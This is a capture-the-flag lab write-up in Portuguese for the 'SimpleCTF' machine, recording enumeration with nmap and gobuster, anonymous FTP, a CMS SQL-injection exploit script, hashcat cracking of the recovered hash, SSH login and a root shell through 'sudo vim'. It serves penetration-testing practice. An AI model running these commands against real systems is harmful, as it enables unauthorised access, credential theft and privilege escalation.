# Lab: SimpleCTF (Easy Mode)

## TASKs:

1.  
2.  
3.  

---

```
ip addr show tun0
```
`10.8.32.62`

```
export IP=10.10.169.195
```

---

## 1) Enumeração com Nmap
```bash
nmap -A 10.10.169.195
```
**Resultados:**
```
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
```
(INFO: FLAG!)

---

## 2) Acesso FTP
```bash
ftp 10.10.169.195
```
> **ftp Nome de utilizador:** anonymous

```bash
ftp> ls
ftp> cd pub
ftp> mget *
ftp> bye
```
**Ficheiro Encontrado:** `ForMitch.txt` (INFO: Informa que a password é fraca)

---

## 3) Enumeração com Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://$IP -x php,sh,txt,html,js,css,py
```
**Resultado:** `/simple` (Site Type: CMS)
```
http://10.10.169.195/simple
```

---

## 4) Exploração - Vulnerabilidade SQLi no CMS
> **ExploitDatabase:** Identificado vuln no CMS (SQLi -> ficheiro Python a descarregar para exe)
```bash
python2 46635.py -u http://10.10.169.195/simple
```
**Credenciais Obtidas:**
Salt for Password: `1dac092e9fa6bb2`
Username: `mitch`
Email: `admin@admin.com`
Password Hash: `0c01f4468bd75d7a84c7eb73846e8d96`

---

## 5) Quebra de Hash com Hashcat
```bash
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac092e9fa6bb2 /usr/share/wordlist/rockyou.txt
```
**Senha Encontrada:** `secret` (INFO: FLAG!)

---

## 6) Acesso via SSH
```bash
ssh mitch@10.10.169.195 -p 2222
```
> **ssh Password:** `secret`

```bash
$ whoami
$ bash
$ ls
$ cat user.txt
```
**Mensagem:** `G00d j0b, keep up!`

---

## 7) Elevação de Privilégios
```bash
ls /home
```
**User Identificado:** `sunbath` (INFO: FLAG!)

```bash
sudo -l
```
**Vulnerabilidade Identificada:** `vim` (leverage to spawn a privileged shell)
**Site GTFOBins**: (vim -> sudo) Identificar um bypass para o Vim.
```bash
sudo vim -c ':!/bin/sh'
```

```bash
# whoami
```
**Resultado:** `root`

```bash
# cd /root
# ls
# cat root.txt
```
**Mensagem Final:**
`w3ll d0ne. You made it!` (INFO: FLAG!)
